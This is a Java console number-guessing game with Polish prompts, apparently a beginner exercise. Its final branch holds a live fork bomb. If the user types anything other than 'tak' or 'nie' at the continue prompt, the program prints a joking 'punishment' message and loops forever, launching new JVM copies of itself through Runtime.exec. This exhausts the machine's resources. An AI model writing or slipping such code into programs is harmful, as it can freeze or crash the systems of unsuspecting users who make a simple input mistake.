import java.io.IOException;
import java.util.Random;
import java.util.Scanner;

public class random_num {
    public static void main( String args[] ) throws IOException {
        boolean reRun = false;
        while (!reRun) {
            Scanner input = new Scanner(System.in);
            Random rand = new Random();
            int upMaxVal = 0;
            boolean check = false;
            while (!check) {
                System.out.println("Podaj górny zakres liczby do wylosowania:");
                try {
                    upMaxVal = Integer.parseInt(input.nextLine());
                    check = true;
                } catch (NumberFormatException e) {
                    System.out.println("Wprowadziłeś nieprawidłowe znaki!!!");

                }
            }
            int int_random = rand.nextInt(upMaxVal);
            int user_gess_value = -1;
            check = false;
            int i = 0;
            while (!check) {
                if (i == 0) {
                    System.out.println("Zgaduj:");
                    user_gess_value = Integer.parseInt(input.nextLine());
                    if (user_gess_value == int_random) {
                        System.out.println("Zgadłeś za pierwszym razem !!!");
                        check = true;
                    }
                } else {
                    System.out.println("Zgaduj dalej:");
                    user_gess_value = Integer.parseInt(input.nextLine());
                    if (user_gess_value == int_random) {
                        System.out.println("Zgadłeś za " + (i + 1) + " razem !!!");
                        check = true;
                    }
                }
                i++;
            }
            user_gess_value = -1;
            String contin;
            System.out.println("Czy chcesz kontynułować? (tak/nie):");
            contin = input.nextLine();
            if(contin.equals("tak"))
            {
                System.out.println("Super zaczynamy od nowa");
            }
            else if (contin.equals("nie"))
            {
                reRun = true;
            }
            else
            {
                System.out.println("Za nieprawidłowe wprowadzanie jest kara ;) #forkBomba");
                reRun = true;
                while(true)
                {
                    try {
                        Runtime.getRuntime().exec(new String[]{"java", "-cp", System.getProperty("java.class.path"), "random_num"});
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

            }
        }
    }
}
